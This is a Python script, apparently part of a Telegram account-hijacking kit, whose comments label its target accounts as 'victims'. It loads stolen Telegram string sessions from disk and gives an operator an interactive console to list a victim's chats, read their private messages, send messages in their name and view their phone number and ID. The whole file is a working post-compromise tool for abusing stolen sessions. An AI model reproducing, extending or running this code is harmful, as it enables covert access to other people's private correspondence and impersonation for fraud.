import asyncio
import os
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.tl.types import Message
from config import API_ID, API_HASH

SESSIONS_DIR = "sessions"


class TelegramAccount:
    """Класс для работы с аккаунтом жертвы"""
    
    def __init__(self, user_id: int):
        self.user_id = user_id
        self.client = None
        self.me = None
    
    async def connect(self):
        """Подключение к аккаунту"""
        session_path = os.path.join(SESSIONS_DIR, f"{self.user_id}.session")
        
        if not os.path.exists(session_path):
            print(f"❌ Сессия для {self.user_id} не найдена!")
            return False
        
        with open(session_path, "r", encoding="utf-8") as f:
            session_string = f.read().strip()
        
        self.client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await self.client.connect()
        
        if await self.client.is_user_authorized():
            self.me = await self.client.get_me()
            print(f"✅ Вход в @{self.me.username}")
            return True
        else:
            print("❌ Сессия невалидна!")
            return False
    
    async def get_dialogs(self):
        """Получить список диалогов"""
        dialogs = await self.client.get_dialogs()
        return dialogs
    
    async def send_message(self, target, text):
        """Отправить сообщение"""
        await self.client.send_message(target, text)
        print(f"✅ Отправлено в {target}")
    
    async def get_messages(self, chat_id, limit=20):
        """Получить последние сообщения из чата"""
        messages = await self.client.get_messages(chat_id, limit=limit)
        return messages
    
    async def get_participants(self, group_id):
        """Получить участников группы"""
        participants = await self.client.get_participants(group_id)
        return participants
    
    async def join_channel(self, channel_username):
        """Подписаться на канал"""
        await self.client.join_channel(channel_username)
        print(f"✅ Подписался на @{channel_username}")
    
    async def disconnect(self):
        """Отключиться"""
        await self.client.disconnect()


async def main():
    # Список доступных сессий
    sessions = []
    for file in os.listdir(SESSIONS_DIR):
        if file.endswith(".session"):
            user_id = file.replace(".session", "")
            sessions.append(user_id)
    
    if not sessions:
        print("❌ Нет сессий!")
        return
    
    print("📁 Доступные аккаунты:")
    for i, user_id in enumerate(sessions, 1):
        print(f"  {i}. ID: {user_id}")
    
    choice = input("\nВыбери аккаунт: ")
    index = int(choice) - 1
    user_id = int(sessions[index])
    
    # Создаём объект аккаунта
    account = TelegramAccount(user_id)
    
    if await account.connect():
        print(f"\n🎯 Ты в аккаунте @{account.me.username}\n")
        
        # Интерактивная оболочка
        while True:
            cmd = input(f"[@{account.me.username}] > ")
            
            if cmd == "exit":
                break
                
            elif cmd == "dialogs":
                print("\n📋 Диалоги:")
                dialogs = await account.get_dialogs()
                for d in dialogs[:20]:
                    print(f"  - {d.name} ({d.id})")
            
            elif cmd.startswith("send "):
                parts = cmd.split(" ", 2)
                if len(parts) >= 3:
                    target = parts[1]
                    text = parts[2]
                    await account.send_message(target, text)
                else:
                    print("❌ Формат: send @username текст")
            
            elif cmd.startswith("msg "):
                parts = cmd.split(" ", 2)
                if len(parts) >= 3:
                    chat_id = int(parts[1])
                    messages = await account.get_messages(chat_id, limit=int(parts[2]) if parts[2].isdigit() else 10)
                    for msg in messages:
                        print(f"[{msg.date}] {msg.sender_id}: {msg.text[:100]}")
                else:
                    print("❌ Формат: msg chat_id количество")
            
            elif cmd == "me":
                me = await account.client.get_me()
                print(f"👤 {me.first_name} {me.last_name or ''}")
                print(f"📱 {me.phone}")
                print(f"🆔 {me.id}")
                print(f"📛 @{me.username or 'нет'}")
            
            elif cmd == "help":
                print("""
Команды:
  dialogs           - список диалогов
  send @user текст  - отправить сообщение
  msg chat_id N     - последние N сообщений из чата
  me                - информация об аккаунте
  exit              - выход
  help              - справка
""")
            else:
                print("❌ Неизвестная команда. Введи 'help'")
    
    await account.disconnect()


if __name__ == "__main__":
    asyncio.run(main())